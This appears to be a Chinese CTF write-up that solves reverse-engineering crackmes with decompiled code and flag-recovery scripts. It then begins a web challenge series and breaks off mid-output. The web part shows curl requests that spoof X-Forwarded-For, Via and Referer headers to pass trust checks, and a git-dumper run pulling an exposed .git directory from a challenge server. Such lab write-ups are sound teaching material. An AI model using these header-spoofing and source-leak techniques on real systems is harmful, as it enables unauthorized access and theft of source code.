```bat
> teyvat_commission_1.exe
Part1: search strings
Part2: two section names
Part3: export table hides tail
```

```c
_QWORD *sub_1400010A0()
{
  _QWORD *StackBase; // rsi
  _QWORD *StackBase_1; // rax
  int v2; // r14d
  _QWORD *v3; // rax
  __int64 i_2; // rcx
  _QWORD *Code; // rax
  Stream *Stream; // rax
  int v7; // esi
  char *v8; // rax
  __int16 n523; // dx
  __int64 i_1; // rbp
  _QWORD *v11; // rax
  _QWORD *v12; // r13
  __int64 v13; // r15
  __int64 i; // rsi
  size_t Size; // rdi
  _QWORD *v16; // rax
  unsigned int Code_1; // [rsp+3Ch] [rbp-5Ch]
  __int64 v18[9]; // [rsp+4Ch] [rbp-4Ch] BYREF

  StackBase = NtCurrentTeb()->NtTib.StackBase;
  while ( 1 )
  {
    StackBase_1 = (_QWORD *)_InterlockedCompareExchange64(&qword_140009040, (signed __int64)StackBase, 0);
    if ( !StackBase_1 )
    {
      v2 = 0;
      goto LABEL_6;
    }
    if ( StackBase == StackBase_1 )
      break;
    Sleep(dwMilliseconds: 0x3E8u);
  }
  v2 = 1;
LABEL_6:
  if ( n2 == 1 )
    sub_140002200(n31: 31);
  if ( n2 )
  {
    dword_140009004 = 1;
  }
  else
  {
    n2 = 1;
    Stream = _acrt_iob_func(Ix: 2u);
    setvbuf(Stream: Stream, Buffer: 0, Mode: 4, Size: 0);
    v7 = crt_atexit(Function: Function);
    if ( v7 )
      sub_140002200(n31: 26);
    sub_140001950();
    set_invalid_parameter_handler(Handler: Handler);
    sub_140001D40();
    if ( *(_WORD *)off_140004360 == 23117 )
    {
      v8 = (char *)off_140004360 + *((int *)off_140004360 + 15);
      if ( *(_DWORD *)v8 == 17744 )
      {
        n523 = *((_WORD *)v8 + 12);
        if ( n523 == 267 )
        {
          if ( *((_DWORD *)v8 + 29) > 0xEu )
            v7 = *((_DWORD *)v8 + 58) != 0;
        }
        else if ( n523 == 523 && *((_DWORD *)v8 + 33) > 0xEu )
        {
          v7 = *((_DWORD *)v8 + 62) != 0;
        }
      }
    }
    dword_140009008 = v7;
    if ( unk_140009080 )
      set_app_type(Type: _crt_gui_app);
    else
      set_app_type(Type: _crt_console_app);
    *_p__fmode() = unk_1400090B0;
    *_p__commode() = unk_140009070;
    if ( (int)sub_140001670() < 0 )
      goto LABEL_40;
    if ( unk_140003030 == 1 )
      sub_140001D30(sub_140001680: sub_140001680);
    if ( unk_140003020 == -1 )
      configthreadlocale(Flag: -1);
    if ( initterm_e(First: &First_, Last: Last_0) )
      sub_140002200(n31: 10);
    LODWORD(v18[0]) = unk_140009060;
    if ( (int)sub_140002230(
                p_i: (unsigned int)&::i,
                (unsigned int)&qword_140009018,
                (unsigned int)&qword_140009010,
                unk_140009050,
                (__int64)v18) < 0
      || (i_1 = ::i, v11 = malloc(Size: 8LL * (int)(::i + 1)), (v12 = v11) == 0) )
    {
LABEL_40:
      sub_140002200(n31: 8);
    }
    if ( (int)i_1 > 0 )
    {
      v13 = *(_QWORD *)&qword_140009018;
      for ( i = 1; ; ++i )
      {
        Size = strlen(Str: *(const char **)(v13 + 8 * i - 8)) + 1;
        v16 = malloc(Size: Size);
        v12[i - 1] = v16;
        if ( !v16 )
          goto LABEL_40;
        memcpy(v16, Src: *(const void **)(v13 + 8 * i - 8), Size: Size);
        if ( i_1 == i )
          break;
      }
      v11 = &v12[i_1];
    }
    *v11 = 0;
    *(_QWORD *)&qword_140009018 = v12;
    SetUnhandledExceptionFilter(lpTopLevelExceptionFilter: TopLevelExceptionFilter);
    initterm(First: &First__0, Last: &Last_);
    sub_1400015E0();
    crt_atexit(Function: sub_140001590);
    n2 = 2;
  }
  if ( !v2 )
    _InterlockedExchange64(&qword_140009040, 0);
  if ( qword_140009100 )
    qword_140009100(0, 2, 0);
  v3 = (_QWORD *)sub_1400021F0();
  i_2 = ::i;
  *v3 = *(_QWORD *)&qword_140009010;
  Code = (_QWORD *)sub_140001500(i: i_2);
  if ( !dword_140009008 )
    exit(Code: (int)Code);
  if ( !dword_140009004 )
  {
    Code_1 = (unsigned int)Code;
    cexit();
    return (_QWORD *)Code_1;
  }
  return Code;
}
```

如果对 MSVC 或者脱壳比较熟悉应该可以看出来这个函数是 `mainCRTStartup()`，其中 `sub_140001500()` 就是 `main()`。

修改一下名称，我们看到 main 函数如下：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  sub_140001570(i: *(__int64 *)&argc);
  SetConsoleOutputCP(wCodePageID: 0xFDE9u);
  SetConsoleCP(wCodePageID: 0xFDE9u);
  puts(Buffer: "Part1: search strings");
  puts(Buffer: "Part2: two section names");
  puts(Buffer: "Part3: export table hides tail");
  if ( (unsigned int)wor1d__() == -1 )
    puts(Buffer: "unreachable");
  return 0;
}
```

#### Part 1

查找字符串可以注意到一个像 flag 的字符串 `lag{welcome`

```bash
.rdata:0000000140004068 66                 byte_140004068  db 'f'                  ; DATA XREF: _wor1d__+16↑r
.rdata:0000000140004069 6C 61 67 7B 77…    aLagWelcome     db 'lag{welcome',0
```

这里得到 flag 的第一部分 `flag{welcome`

#### Part 2

![](https://img.halfcity.top/2026/11/10/7489b7eb99f5a41dd14c826bcb97e6bd.png)

注意到两个名称特殊的段，这应该就是 flag 的第二部分，我们按照字符的逻辑拼接一下。

这样我们就得到了 flag 的第二部分 `_t0_reverse`

#### Part 3

![](https://img.halfcity.top/2026/11/10/a90425dbf52fa288f60989c6ec3548c9.png)

在导出表中可以找到另一个字符串 `_wor1d__`

但是我们可以注意到这里并没有 flag 的结尾，可是我们也无路可走了。

注意到 `Part3: export table hides tail` 这里提示了导出表的尾部似乎被隐藏了。

所以这类的 PE 头可能被魔改了，我们可以使用现有的网上的脚本恢复，也可以直接使用现代的 PE 浏览工具查看。

这些工具大多会手动解析导入表而不会听 PE 头中的描述。

这里我选择使用 `PE-bear`。

![](https://img.halfcity.top/2026/11/10/d59a5bc58701fc7e37f59e495da69d27.png)

可以看到这个工具正确解析的导出表并得到了最后的字符串 `_wor1d!}`

得到最后的 flag：

```txt
flag{welcome_t0_reverse_wor1d!}
```

### 曼波维修部·一：你先别急，让它跑一下

#### 分析

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _BYTE v4[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts_w(Duty_passphrase:: "Duty passphrase:");
  sub_1325("Duty passphrase:", a2);
  if ( (unsigned int)sub_1208(v4) && (unsigned int)sub_1526(v4) )
    puts_w(Duty_passphrase:: "Schedule accepted. You may leave on time.");
  else
    puts_w(Duty_passphrase:: "The cat stares at the invalid schedule.");
  return 0;
}
```

这是 main 函数。

```c
__int64 __fastcall sub_1325(char *Duty_passphrase:)
{
  int v1; // ecx
  __int64 j_1; // rax
  unsigned int v3; // [rsp+0h] [rbp-10h]
  unsigned int v4; // [rsp+0h] [rbp-10h]
  int i; // [rsp+4h] [rbp-Ch]
  int j; // [rsp+8h] [rbp-8h]

  v3 = 0xC0FFEE11;
  for ( i = 0; i <= 31; ++i )
  {
    v1 = v3 ^ (byte_2040[i] << (8 * (i & 3)));
    j_1 = v1 + (unsigned int)byte_2060[31 - i] - 1640531527;
    v3 = v1 + byte_2060[31 - i] - 1640531527;
  }
  for ( j = 0; j <= 23; ++j )
  {
    v4 = (((v3 << 13) ^ v3) >> 17) ^ (v3 << 13) ^ v3;
    v3 = (32 * v4) ^ v4;
    j_1 = j;
    byte_4020[j] = (61 * j)
                 ^ byte_2060[((_BYTE)j + (((unsigned __int8)v3 ^ (unsigned __int8)(11 * j)) & 0x1F) + 7) & 0x1F]
                 ^ byte_2040[((unsigned __int8)v3 ^ (unsigned __int8)(11 * j)) & 0x1F]
                 ^ (v3 >> (8 * (j & 3)));
  }
  return j_1;
}
```

这是一个 TEA 风格的加密函数，其中 `byte_4020` 是未初始化的全局变量，`byte_2060` 和 `byte_2040` 充当类似明文和 key 的角色将生成的初始化密钥赋值给 `byte_4020`。

换句话说这里没有处理输入，这里仅用于初始化 `byte_4020`，因此后面我们可以直接抄过来用。

```c
__int64 __fastcall sub_1208(void *dest)
{
  char s[8]; // [rsp+10h] [rbp-70h] BYREF
  __int64 v3; // [rsp+18h] [rbp-68h]
  __int64 v4; // [rsp+20h] [rbp-60h]
  __int64 v5; // [rsp+28h] [rbp-58h]
  __int64 v6; // [rsp+30h] [rbp-50h]
  __int64 v7; // [rsp+38h] [rbp-48h]
  __int64 v8; // [rsp+40h] [rbp-40h]
  __int64 v9; // [rsp+48h] [rbp-38h]
  __int64 v10; // [rsp+50h] [rbp-30h]
  __int64 v11; // [rsp+58h] [rbp-28h]
  __int64 v12; // [rsp+60h] [rbp-20h]
  __int64 v13; // [rsp+68h] [rbp-18h]
  unsigned __int64 v14; // [rsp+78h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  *(_QWORD *)s = 0;
  v3 = 0;
  v4 = 0;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  if ( (unsigned int)__isoc99_scanf("%95s", s) != 1 )
    return 0;
  if ( strlen(s: s) != 30 || memcmp(s1: s, s2: "flag{", n: 5u) || BYTE5(v5) != 125 )
    return 0;
  memcpy(dest: dest, src: &s[5], n: 0x18u);
  return 1;
}
```

这里开始提供输入，这个函数大致的逻辑是提供输出并提取输入 flag{...} 中间的内容 24 个字节。

```c
unsigned __int64 __fastcall sub_1441(__int64 a1, _BYTE *s1)
{
  unsigned __int8 v3; // [rsp+17h] [rbp-29h]
  int i; // [rsp+18h] [rbp-28h]
  int j; // [rsp+1Ch] [rbp-24h]
  _BYTE v6[24]; // [rsp+20h] [rbp-20h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  for ( i = 0; i <= 23; ++i )
  {
    v3 = *(_BYTE *)(i + a1) ^ byte_4020[i];
    v6[i] = (2 * v3) | (v3 >> 7);
  }
  for ( j = 0; j <= 23; ++j )
    s1[j] = v6[(j + 19) % 24];
  return v7 - __readfsqword(0x28u);
}
```

这里是一个 RC4 削弱版风格的加密。

其中 `v6[i] = (2 * v3) | (v3 >> 7);` 这里将 v3 左移一位并将 v3 原先的最高位 bit 放在第一位。

想还原也很简单，将原本被置换的位换回去就好了。

这里 `sub_1441()` 被 `sub_1526()` 调用并最后与密文 `s2_` 比对。

建议使用 LazyDump 这个插件来 dump 出数据。

我们接下来可以将写出解密脚本：

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

unsigned char byte_2040[32] = {
    0x17, 0x29, 0x43, 0x61, 0x83, 0xA7, 0xC1, 0xE3, 0x35, 0x72, 0x19, 0xB4, 0x5D, 0x90, 0xEE, 0x08,
    0x6A, 0x2C, 0xF1, 0x47, 0x9B, 0xD0, 0x54, 0x7E, 0x11, 0x88, 0xCD, 0x3F, 0xA2, 0x65, 0x0B, 0xDA
};

unsigned char byte_2060[32] = {
    0x52, 0x31, 0x77, 0x18, 0xD2, 0x44, 0x9A, 0x0F, 0xBC, 0x26, 0x63, 0xE8, 0x05, 0x91, 0x4A, 0xD7,
    0x39, 0xAF, 0x10, 0x6C, 0xF5, 0x82, 0x2D, 0xC0, 0x74, 0x1B, 0x98, 0x56, 0xE1, 0x03, 0xBD, 0x49
};

unsigned char s2_[24] = {
    0xC1, 0x1E, 0x8D, 0x13, 0x20, 0x02, 0xBE, 0x07, 0x28, 0x02, 0xCD, 0xDC, 0xD7, 0x85, 0x38, 0x27,
    0x9C, 0x80, 0x01, 0x32, 0x73, 0x42, 0x90, 0xF5
};

unsigned char byte_4020[24] = { 0 };

__int64 init_key()
{
    int v1;          // ecx
    __int64 j_1;     // rax
    unsigned int v3; // [rsp+0h] [rbp-10h]
    unsigned int v4; // [rsp+0h] [rbp-10h]
    int i;           // [rsp+4h] [rbp-Ch]
    int j;           // [rsp+8h] [rbp-8h]

    v3 = -1056969199;
    for (i = 0; i <= 31; ++i)
    {
        v1 = v3 ^ (byte_2040[i] << (8 * (i & 3)));
        j_1 = v1 + (unsigned int)byte_2060[31 - i] - 1640531527;
        v3 = v1 + byte_2060[31 - i] - 1640531527;
    }
    for (j = 0; j <= 23; ++j)
    {
        v4 = (((v3 << 13) ^ v3) >> 17) ^ (v3 << 13) ^ v3;
        v3 = (32 * v4) ^ v4;
        j_1 = j;
        byte_4020[j] = (61 * j) ^ byte_2060[((uint8_t)j + (((unsigned __int8)v3 ^ (unsigned __int8)(11 * j)) & 0x1F) + 7) & 0x1F] ^ byte_2040[((unsigned __int8)v3 ^ (unsigned __int8)(11 * j)) & 0x1F] ^ (v3 >> (8 * (j & 3)));
    }
    return j_1;
}

int main()
{
    init_key();

    uint8_t flag[25] = { 0 };

    unsigned __int8 v3;  // [rsp+17h] [rbp-29h]
    uint8_t v6[24];      // [rsp+20h] [rbp-20h]

    // unsigned __int64 __fastcall encrypt(_BYTE * input, _BYTE * out)
    // {
    //     unsigned __int8 v3;  // [rsp+17h] [rbp-29h]
    //     int i;               // [rsp+18h] [rbp-28h]
    //     int j;               // [rsp+1Ch] [rbp-24h]
    //     _BYTE v6[24];        // [rsp+20h] [rbp-20h]
    //     unsigned __int64 v7; // [rsp+38h] [rbp-8h]
    //
    //     v7 = __readfsqword(0x28u);
    //     for (i = 0; i <= 23; ++i)
    //     {
    //         v3 = input[i] ^ byte_4020[i];
    //         v6[i] = (2 * v3) | (v3 >> 7);
    //     }
    //     for (j = 0; j <= 23; ++j)
    //         out[j] = v6[(j + 19) % 24];
    //     return v7 - __readfsqword(0x28u);
    // }

    for (uint8_t j = 0; j <= 23; ++j)
        v6[(j + 19) % 24] = s2_[j];

    for (uint8_t i = 0; i <= 23; ++i)
    {
        v3 = (v6[i] >> 1) | ((v6[i] & 1) << 7);
        flag[i] = v3 ^ byte_4020[i];
    }

    printf("[+] flag{%s}", flag);

    return 0;
}
```

输出如下：

```bat
> decrypt.exe
[+] flag{m4nb0_cat_runs_at_boot!!}
```

```txt
flag{m4nb0_cat_runs_at_boot!!}
```

### 银河售后中心·一：垃圾桶也要验证码？

#### 分析

```java
package org.galactic.aftercare.bin;

import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import java.io.IOException;

public final class MainActivity extends AppCompatActivity {
    private boolean accepted;
    private TextView statusText;
    private boolean submitted;
    private EditText tokenInput;
    private BinVerifier verifier;

    // 检测为 Lambda 实现
    private void lambda$onCreate$0(View view0) [...]

    // 检测为 Lambda 实现
    private boolean lambda$onCreate$1(TextView textView0, int v, KeyEvent keyEvent0) [...]

    @Override  // androidx.fragment.app.FragmentActivity
    protected void onCreate(Bundle bundle0) {
        super.onCreate(bundle0);
        this.setContentView(layout.activity_main);
        this.tokenInput = (EditText)this.findViewById(id.token_input);
        this.statusText = (TextView)this.findViewById(id.status_text);
        Button button0 = (Button)this.findViewById(id.open_button);
        try {
            this.verifier = new BinVerifier(this.getAssets());
        }
        catch(IOException unused_ex) {
            this.statusText.setText(string.resource_error);
            button0.setEnabled(false);
        }

        button0.setOnClickListener((View view0) -> this.submitToken());
        this.tokenInput.setOnEditorActionListener((TextView textView0, int v, KeyEvent keyEvent0) -> {
            if(v == 6) {
                this.submitToken();
                return true;
            }

            return false;
        });
        if(bundle0 != null && this.verifier != null) {
            this.submitted = bundle0.getBoolean("submitted", false);
            this.accepted = bundle0.getBoolean("accepted", false);
            if(this.submitted) {
                this.showResult();
            }
        }
    }

    @Override  // androidx.activity.ComponentActivity
    protected void onSaveInstanceState(Bundle bundle0) {
        bundle0.putBoolean("submitted", this.submitted);
        bundle0.putBoolean("accepted", this.accepted);
        super.onSaveInstanceState(bundle0);
    }

    private void showResult() {
        this.statusText.setText((this.accepted ? string.accepted : string.rejected));
        this.statusText.setTextColor(this.getColor((this.accepted ? color.success : color.error)));
    }

    private void submitToken() {
        BinVerifier binVerifier0 = this.verifier;
        if(binVerifier0 == null) {
            return;
        }

        this.accepted = binVerifier0.check(this.tokenInput.getText().toString());
        this.submitted = true;
        this.showResult();
    }
}
```

这是程序的 MainActivity。

注意这里调用了一个加密 Utils：

```java
private void submitToken() {
    BinVerifier binVerifier0 = this.verifier;
    if(binVerifier0 == null) {
        return;
    }

    this.accepted = binVerifier0.check(this.tokenInput.getText().toString());
    this.submitted = true;
    this.showResult();
}
```

我们来检查一下：

```java
package org.galactic.aftercare.bin;

import android.content.res.AssetManager;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public final class BinVerifier {
    private static final int BODY_LENGTH = 24;
    private static final String TARGET = "IVQHKgkWY1AdJRZJMEUAFAIRNEUcFBZY";
    private final byte[] mask;
    private final int[] order;

    public BinVerifier(AssetManager assetManager0) throws IOException {
        String[] arr_s = BinVerifier.readAsset(assetManager0, "sorting_order.txt").trim().split("\\s+");
        if(arr_s.length != 24) {
            throw new IOException("Invalid sorting table");
        }

        this.order = new int[24];
        boolean[] arr_z = new boolean[24];
        for(int v = 0; v < 24; ++v) {
            try {
                int v1 = Integer.parseInt(arr_s[v]);
                if(v1 < 0 || v1 >= 24 || arr_z[v1]) {
                    throw new IOException("Invalid sorting table");
                }

                arr_z[v1] = true;
                this.order[v] = v1;
            }
            catch(NumberFormatException numberFormatException0) {
                throw new IOException("Invalid sorting table", numberFormatException0);
            }
        }

        byte[] arr_b = BinVerifier.readAsset(assetManager0, "sorting_mask.txt").trim().getBytes(StandardCharsets.US_ASCII);
        this.mask = arr_b;
        if(arr_b.length == 0) {
            throw new IOException("Empty sorting mask");
        }
    }

    public boolean check(String s) {
        if(s != null && s.length() == 30 && s.startsWith("flag{") && s.endsWith("}")) {
            String s1 = s.substring(5, s.length() - 1);
            int v1 = 0;
            while(v1 < s1.length()) {
                if(s1.charAt(v1) >= 33 && s1.charAt(v1) <= 0x7E) {
                    ++v1;
                    continue;
                }

                return false;
            }

            byte[] arr_b = s1.getBytes(StandardCharsets.US_ASCII);
            byte[] arr_b1 = new byte[24];
            for(int v = 0; v < 24; ++v) {
                arr_b1[v] = (byte)(arr_b[this.order[v]] ^ this.mask[v % this.mask.length]);
            }

            return "IVQHKgkWY1AdJRZJMEUAFAIRNEUcFBZY".equals(Base64.encodeToString(arr_b1, 2));
        }

        return false;
    }

    private static String readAsset(AssetManager assetManager0, String s) throws IOException {
        StringBuilder stringBuilder0 = new StringBuilder();
        try(BufferedReader bufferedReader0 = new BufferedReader(new InputStreamReader(assetManager0.open(s), StandardCharsets.UTF_8))) {
            String s1;
            while((s1 = bufferedReader0.readLine()) != null) {
                stringBuilder0.append(s1);
                stringBuilder0.append('\n');
            }

            return stringBuilder0.toString();
        }
    }
}
```

这里在构造函数中初始化了 mask 和 order 的值并在 `check()` 中作为密钥。

而 `check()` 和上面一题类似同样是 RC4 风格削弱版加密。

我们需要构造加密实例的参数，读取 assets 中的 `sorting_mask.txt` 和 `sorting_order.txt` 我们可以得到我们需要的参数。

接下来直接解密即可：

```py
import base64

TARGET = "IVQHKgkWY1AdJRZJMEUAFAIRNEUcFBZY"
ORDER = [5, 12, 19, 2, 9, 16, 23, 6, 13, 20, 3, 10, 17, 0, 7, 14, 21, 4, 11, 18, 1, 8, 15, 22]
MASK = b"B1nKey"

enc = base64.b64decode(TARGET)
original = bytearray(24)

for v in range(24):
    original[ORDER[v]] = enc[v] ^ MASK[v % len(MASK)]

flag = "flag{" + original.decode("ascii") + "}"
print(flag)
```

```txt
flag{trashcan_l0ves_sorting!!}
```

### 阿萨拉下班指南·一：机密档案

#### 分析

观察到程序加壳：

![](https://img.halfcity.top/2026/11/10/2f6f516dd0dd5ba9b10834629d51f84b.png)

先尝试使用脱壳机，如果不行手脱也很简单：

```bat
> upx -d D:\data\workspace\download\asara_escape_1.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2023
UPX 4.1.0       Markus Oberhumer, Laszlo Molnar & John Reiser    Aug 8th 2023

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     32768 <-      9216   28.13%    win64/pe     asara_escape_1.exe

Unpacked 1 file.
```

很好直接脱下来了，我们来分析函数的逻辑。

同上快速定位到 main 函数：

```c
Stream *__fastcall sub_1400016B0(__int64 i)
{
  Stream *Stream; // rax
  Stream *Stream_1; // rax
  unsigned int v3; // eax
  char Buffer[168]; // [rsp+20h] [rbp-A8h] BYREF

  sub_140001760(i: i);
  puts(Buffer: "Asara Escape 1: unpack the box first.");
  sub_140002380(Format: "evac credential> ");
  Stream = __acrt_iob_func(Ix: 1u);
  fflush(Stream: Stream);
  Stream_1 = __acrt_iob_func(Ix: 0);
  if ( fgets(Buffer: Buffer, MaxCount: 160, Stream: Stream_1) && (v3 = sub_1400014FF(Buffer: Buffer), (unsigned int)sub_14000167F(Buffer: Buffer, v3)) )
  {
    puts(Buffer: "evac request accepted");
    return 0;
  }
  else
  {
    puts(Buffer: "not accepted");
    return (Stream *)1;
  }
}
```

这里读取了 160 个字节的数据到缓冲区并传递给了 `sub_1400014FF()` 和 `sub_14000167F()` 这两个函数。

```c
size_t __fastcall sub_1400014FF(char *Buffer)
{
  size_t result; // rax
  char *v3; // rdx

  result = strlen(Str: Buffer);
  if ( (int)result > 0 )
  {
    v3 = &Buffer[(int)result - 1];
    do
    {
      if ( *v3 != 10 && *v3 != 13 )
        break;
      --v3;
      result = (unsigned int)(result - 1);
    }
    while ( (_DWORD)result );
  }
  return result;
}
```

这个函数是用于过滤末尾的字符的。

```c
int __fastcall sub_14000153C(unsigned __int8 *Buf1, int n30)
{
  int result; // eax
  unsigned __int8 *v3; // rbx

  if ( n30 != 30 )
    return 0;
  result = memcmp(Buf1: Buf1, Buf2: "flag{", Size: 5u);
  if ( result )
    return 0;
  if ( Buf1[29] == '}' )
  {
    v3 = Buf1 + 5;
    while ( 1 )
    {
      result = sub_1400014E0(*v3);
      if ( !result )
        break;
      if ( ++v3 == Buf1 + 29 )
        return 1;
    }
  }
  return result;
}
```

sub_14000153C() 这个函数似乎是校验 flag 合法性的。

```c
__int64 __fastcall sub_1400015A8(__int64 a1, __int64 a2)
{
  int n3; // ecx
  __int64 i; // rdx
  __int64 v6; // rbx
  __int64 v7; // r11
  __int64 result; // rax

  n3 = 3;
  for ( i = 0; i != 24; ++i )
  {
    v6 = n3 % 24;
    v7 = (int)i % 6;
    result = (unsigned int)i + (unsigned __int8)(byte_140004000[v7] ^ *(_BYTE *)(a1 + v6));
    *(_BYTE *)(a2 + i) = i + (byte_140004000[v7] ^ *(_BYTE *)(a1 + v6));
    n3 += 5;
  }
  return result;
}
```

这个应该就是加密的逻辑了，很简单，其中 `byte_140004000` 是密钥，简单还原一下：

```c
__int64 __fastcall encrypt(_BYTE *input, _BYTE *out)
{
  int factor; // ecx
  __int64 i; // rdx
  __int64 input_index; // rbx
  __int64 key_index; // r11
  __int64 result; // rax

  factor = 3;
  for ( i = 0; i != 24; ++i )
  {
    input_index = factor % 24;
    key_index = (int)i % 6;
    result = (unsigned int)i + (unsigned __int8)(byte_140004000[key_index] ^ input[input_index]);
    out[i] = i + (byte_140004000[key_index] ^ input[input_index]);
    factor += 5;
  }
  return result;
}
```

随后又调用了另一个函数，由于异或的特性相等输出 0 ，因此这里是判断是否逐字节都相等：

```c
_BOOL8 __fastcall sub_140001629(_BYTE *buf)
{
  char v1; // r8
  __int64 i; // rax

  v1 = aAaaaaaaaaaaaaa[0] ^ 0x41;
  for ( i = 0; i != 24; ++i )
    v1 |= byte_140004010[i] ^ buf[i];
  return v1 == 0;
}
```

这里的 v1 就是标识符。

我们可以轻松找到两个密钥：

```bash
.rdata:0000000140004000 39 17 5C 23 71     byte_140004000  db 39h, 17h, 5Ch, 23h, 71h, 0Eh, 0Ah dup(0)
.rdata:0000000140004000 0E 00 00 00 00…                                            ; DATA XREF: sub_1400015A8+11↑o
.rdata:0000000140004010                    ; _BYTE byte_140004010[80]
.rdata:0000000140004010 66 49 3B 4F 44     byte_140004010  db 66h, 49h, 3Bh, 4Fh, 44h, 6Dh, 52h, 68h, 3Fh, 5Ah, 4Ah
.rdata:0000000140004010 6D 52 68 3F 5A…                                            ; DATA XREF: sub_140001629+11↑o
.rdata:000000014000401B 89 64 32 47 5E…                    db 89h, 64h, 32h, 47h, 5Eh, 19h, 7Eh, 21h, 86h, 4Dh, 91h
.rdata:0000000140004026 44 55 00 00 00…                    db 44h, 55h, 8 dup(0), 61h, 73h, 61h, 72h, 61h, 20h, 65h
.rdata:0000000140004037 76 61 63 20 72…                    db 76h, 61h, 63h, 20h, 72h, 65h, 63h, 65h, 69h, 70h, 74h
.rdata:0000000140004042 00 00 00 00 00…                    db 1Eh dup(0)
```

我们还是使用 LazyDump 导出密钥。

加密函数的逻辑是正向线性加密，我们正向解密即可。

解密脚本如下：

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

unsigned char byte_140004000[16] = {
    0x39, 0x17, 0x5C, 0x23, 0x71, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

unsigned char byte_140004010[80] = {
    0x66, 0x49, 0x3B, 0x4F, 0x44, 0x6D, 0x52, 0x68, 0x3F, 0x5A, 0x4A, 0x89, 0x64, 0x32, 0x47, 0x5E,
    0x19, 0x7E, 0x21, 0x86, 0x4D, 0x91, 0x44, 0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x61, 0x73, 0x61, 0x72, 0x61, 0x20, 0x65, 0x76, 0x61, 0x63, 0x20, 0x72, 0x65, 0x63, 0x65, 0x69,
    0x70, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

int main()
{
    // __int64 __fastcall encrypt(_BYTE * input, _BYTE * out)
    // {
    //     int factor;          // ecx
    //     __int64 i;           // rdx
    //     __int64 input_index; // rbx
    //     __int64 key_index;   // r11
    //     __int64 result;      // rax

    //     factor = 3;
    //     for (i = 0; i != 24; ++i)
    //     {
    //         input_index = factor % 24;
    //         key_index = (int)i % 6;
    //         result = (unsigned int)i + (unsigned __int8)(byte_140004000[key_index] ^ input[input_index]);
    //         out[i] = i + (byte_140004000[key_index] ^ input[input_index]);
    //         factor += 5;
    //     }
    //     return result;
    // }

    uint8_t flag[25] = { 0 };

    uint8_t factor = 3;
    for (uint8_t i = 0; i < 24; i++)
    {
        uint8_t input_index = factor % 24;
        uint8_t key_index = i % 6;
        flag[input_index] = (byte_140004010[i] - i) ^ byte_140004000[key_index];
        factor += 5;
    }

    printf("[+] flag{%s}", flag);

    return 0;
    
}
```

输出如下:

```bat
> decrypt.exe
[+] flag{red_f1le_upx_evac_ok2601}
```

```txt
flag{red_f1le_upx_evac_ok2601}
```

## Web

### FLAG 怪盗团·一

功利一点，直接进入试炼：

#### Track 1

![](https://img.halfcity.top/2026/11/10/ac9347fb08aacff43567e3d71fc5c9f2.png)

```txt
【试炼 01】：向 /api/challenge/handshake 发送 POST 请求，请求正文包含 codename=JOKER。
```

简单的握手，直接使用 curl 请求：

```bash
❯ curl -X POST http://110.42.112.160:47630/api/challenge/handshake --data "codename=JOKER"
{"message":"握手完成，回到聊天窗口吧！","ok":true}
```

#### Track 2

![](https://img.halfcity.top/2026/11/10/159315c6cfd4c3af84f9ec345788e2b7.png)

```txt
【试炼 02】：请求 /api/challenge/trust，伪造用于标识客户端的真实 IP 地址的请求头为本地回环地址。
```

可以尝试添加一个 `X-Forwarded-For` 头：

```bash
❯ curl -X POST http://110.42.112.160:47630/api/challenge/trust --header "X-Forwarded-For: 127.0.0.1"
{"message":"验证通过，回到聊天窗口吧！","ok":true,"stage":2}
```

#### Track 3

![](https://img.halfcity.top/2026/11/10/7d933366ad085f7267984522da4e2178.png)

```txt
【试炼 03】：请求 /api/challenge/trust，添加表示代理服务器的请求头，内容为 phantom-proxy。
```

#### Track 4

![](https://img.halfcity.top/2026/11/10/87cf401a05d0c1551ca90342aed6bded.png)

```bash
❯ curl -X POST http://110.42.112.160:47630/api/challenge/trust --header "Via: phantom-proxy"
{"message":"验证通过，回到聊天窗口吧！","ok":true,"stage":3}
```

#### Track 5

![](https://img.halfcity.top/2026/11/10/c452c68270c539c539dddabf2fe59eaa.png)

```bash
❯ curl -X POST http://110.42.112.160:47630/api/challenge/trust --header "Referer: https://mementos.local/"
{"message":"验证通过，回到聊天窗口吧！","ok":true,"stage":4}
```

#### Track 6

![](https://img.halfcity.top/2026/11/10/3d2b34f46d16015b0a92cb9c64467e1a.png)

我们进入到了这个网址 `http://110.42.112.160:47630/medjed/`。

我们根据提示 dumper 泄露的 .git：

```bash
❯ git-dumper http://110.42.112.160:37583/medjed/ .
Warning: Destination '.' is not empty
[-] Testing http://110.42.112.160:37583/medjed/.git/HEAD [200]
[-] Testing http://110.42.112.160:37583/medjed/.git/ [404]
[-] Fetching common files
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/post-receive.sample [404]
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/post-commit.sample [404]
[-] http://110.42.112.160:37583/medjed/.git/hooks/post-commit.sample responded with status code 404
[-] http://110.42.112.160:37583/medjed/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://110.42.112.160:37583/medjed/.git/hooks/commit-msg.sample [200]
[-] Fetching http://110.42.112.160:37583/medjed/.gitignore [404]
